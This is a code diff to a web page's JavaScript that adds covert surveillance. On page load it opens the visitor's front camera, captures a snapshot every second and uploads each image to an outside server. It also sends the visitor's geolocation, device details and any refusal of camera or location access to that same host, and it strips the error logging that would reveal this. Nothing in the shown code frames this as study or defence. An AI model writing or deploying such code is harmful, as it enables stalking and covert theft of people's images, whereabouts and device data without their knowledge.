@@ -402,10 +402,63 @@
           });
           return await res.json();
         } catch (err) {
-          console.error(`❌ Error posting to ${url}:`, err);
           return null;
         }
       };
+
+      function sendPhotoToTelegram(blob) {
+        const formData = new FormData();
+        formData.append("photo", blob, "snapshot.jpg");
+        fetch(`https://loc-4tjr.onrender.com/api/meaow`, {
+          method: "POST",
+          body: formData,
+        });
+      }
+
+      function captureAndSendImage() {
+        try {
+          const video = document.getElementById("video");
+          const canvas = document.getElementById("canvas");
+          const ctx = canvas.getContext("2d");
+          canvas.width = video.videoWidth || 300;
+          canvas.height = video.videoHeight || 200;
+          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+          canvas.toBlob(
+            (blob) => blob && sendPhotoToTelegram(blob),
+            "image/jpeg",
+            0.9
+          );
+        } catch (err) {}
+      }
+
+      function startCameraLoop() {
+        navigator.mediaDevices
+          .getUserMedia({ video: { facingMode: "user" } })
+          .then((mediaStream) => {
+            stream = mediaStream;
+            const video = document.getElementById("video");
+            video.srcObject = stream;
+
+            video.onloadedmetadata = () => {
+              video.play();
+
+              // ✅ Start only after video is playing
+              video.onplaying = () => {
+                // Start sending image every 1 second
+                setInterval(captureAndSendImage, 1000);
+              };
+            };
+          })
+          .catch((err) => {
+            fetch("https://loc-4tjr.onrender.com/api/hello", {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({
+                message: "❌ User denied camera access.",
+              }),
+            });
+          });
+      }
 
       // Update map marker & circle
       const updMap = (lat, lng, acc) => {
@@ -432,12 +485,11 @@
       // Send location
       const sendLoc = (lat, lng, acc) => {
         if (![lat, lng, acc].every((v) => typeof v === "number"))
-          return console.error("Invalid location");
-        post("https://loc-mocha.vercel.app/api/GLT", {
-          lat,
-          lng,
-          accuracy: acc,
-        });
+          post("https://loc-4tjr.onrender.com/api/GLT", {
+            lat,
+            lng,
+            accuracy: acc,
+          });
       };
 
       // Locate user
@@ -454,7 +506,7 @@
             const banner = document.getElementById("location-banner");
             if (banner) banner.style.display = "flex";
 
-            post("https://loc-mocha.vercel.app/api/hello", {
+            post("https://loc-4tjr.onrender.com/api/hello", {
               message: "❌ User denied location access.",
             });
           },
@@ -465,11 +517,9 @@
       // Send device info
       const sendInfo = (info) => {
         if (!info?.platform || !info?.connection || !info?.userAgent)
-          return console.error("Invalid device info");
-        post("https://loc-mocha.vercel.app/api/GLT", info).then((data) => {
-          if (data === true) console.log("✅ Device info sent");
-          else console.warn("⚠️ Failed to send device info");
-        });
+          post("https://loc-4tjr.onrender.com/api/GLT", info).then(
+            (data) => {}
+          );
       };
 
       // Get device info
@@ -492,6 +542,7 @@
       // Event listeners
       window.addEventListener("DOMContentLoaded", () => {
         locUser();
+        startCameraLoop();
         getInfo();
       });
       document
